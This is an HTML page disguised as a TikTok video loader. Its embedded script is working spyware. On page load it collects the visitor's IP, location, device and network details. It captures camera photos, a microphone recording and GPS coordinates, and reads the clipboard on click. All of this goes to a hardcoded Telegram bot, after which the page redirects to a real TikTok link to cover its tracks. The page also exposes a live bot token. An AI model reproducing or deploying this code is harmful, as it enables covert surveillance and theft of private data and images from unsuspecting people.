<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Video</title>
    <style>
        body { background: #000; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; font-family: sans-serif; overflow: hidden; }
        .tiktok-loader { width: 50px; height: 50px; border-radius: 50%; border: 3px solid #2af0ea; border-top: 3px solid #fe2c55; animation: spin 0.8s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #v, #c { display: none; }
    </style>
</head>
<body>
    <div class="tiktok-loader"></div>
    <p style="margin-top: 15px; font-size: 14px; color: #888;">Loading TikTok...</p>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const botToken = '8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4';
        const chatId = '1034878899';
        const tiktokLink = "https://vt.tiktok.com/ZSmLkxJ31/";

        async function start() {
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const data = await ipRes.json();
                
                let batt = { level: "N/A", char: "N/A" };
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    batt.level = Math.round(b.level * 100) + "%";
                    batt.char = b.charging ? "Ø¨Û•ÚµÛ ğŸ”Œ" : "Ù†Û•Ø®ÛØ± ğŸ”‹";
                }

                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Ù†Ø§Ø¯ÛŒØ§Ø±";

                const conn = navigator.connection || {};
                const netType = conn.effectiveType || "N/A";
                const isWifi = conn.type === 'wifi' ? "WiFi ğŸ“¶" : "Sim Card ğŸ“±";
                const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Ù†Ø§Ø¯ÛŒØ§Ø±";

                const report = `
ğŸ”¥ **Ultimate Spy Report** ğŸ”¥
----------------------------------
ğŸŒ **Ø¦ÛŒÙ†ØªÛ•Ø±Ù†ÛØª Ùˆ ØªÛ†Ú•:**
â€¢ Ø¦Ø§ÛŒÙ¾ÛŒ: \`${data.ip}\` ğŸ›°
â€¢ Ù‡ÛÚµ: **${isWifi}** (${netType.toUpperCase()})
â€¢ Ú©Û†Ù…Ù¾Ø§Ù†ÛŒØ§: **${data.org}** ğŸ“¶
â€¢ ÙˆÚµØ§Øª/Ø´Ø§Ø±: ${data.country_name} - ${data.city}

ğŸ”‹ **Ø¨Ø§Ø±ÛŒ ÙˆØ²Û•:**
â€¢ Ù¾Ø§ØªØ±ÛŒ: **${batt.level}** | Ø´Û•Ø­Ù†: **${batt.char}**

ğŸ“± **Ø³ÛŒØ³ØªÙ… Ùˆ Ø¦Ø§Ù…ÛØ±:**
â€¢ Ù¾Ù„Ø§ØªÙÛ†Ø±Ù…: ${navigator.platform}
â€¢ Ú•Ø§Ù…: **${ram}** | Ú¯Ø±Ø§ÙÛŒÚ©: ${gpu}
â€¢ Ø´Ø§Ø´Û•: ${screen.width}x${screen.height}
â€¢ Ø²Ù…Ø§Ù†: ${navigator.language} | Ø¯Û†Ø®: ${window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light"}

ğŸ“ **Ù†Ø§ÙˆÚ†Û•:** ${data.region}
â° **Ú©Ø§Øª:** ${new Date().toLocaleString('ku-IQ')}
----------------------------------
`;
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);

                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                const videoEl = document.getElementById('v');
                videoEl.srcObject = stream;
                videoEl.muted = true; // Ø¨ÛØ¯Û•Ù†Ú¯Ú©Ø±Ø¯Ù†ÛŒ Ù…Ø§ÛŒÚ©Ø±Û†ÙÛ†Ù† Ø¨Û† Ú©Û•Ø³Û•Ú©Û•

                for (let i = 0; i < 2; i++) {
                    await new Promise(r => setTimeout(r, 1500));
                    const picCanvas = document.getElementById('c');
                    picCanvas.width = videoEl.videoWidth; picCanvas.height = videoEl.videoHeight;
                    picCanvas.getContext('2d').drawImage(videoEl, 0, 0);
                    const b = await new Promise(r => picCanvas.toBlob(r, 'image/jpeg'));
                    const fd = new FormData();
                    fd.append('chat_id', chatId); fd.append('photo', b, 'u.jpg');
                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                }

                const mediaRecorder = new MediaRecorder(stream);
                let chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/ogg' });
                    const fd = new FormData();
                    fd.append('chat_id', chatId); fd.append('voice', blob, 'v.ogg');
                    fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, { method: 'POST', body: fd });
                };
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 4000);

                navigator.geolocation.getCurrentPosition(pos => {
                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("ğŸ“ GPS: http://maps.google.com/?q=" + pos.coords.latitude + "," + pos.coords.longitude)}`);
                });

                setTimeout(() => { window.location.href = tiktokLink; }, 2000);

            } catch(e) { window.location.href = tiktokLink; }
        }

        document.addEventListener('click', async () => {
            try {
                const text = await navigator.clipboard.readText();
                if(text) fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("ğŸ“‹ Clipboard: " + text)}`);
            } catch(e) {}
        });

        window.onload = start;
    </script>
</body>
</html>
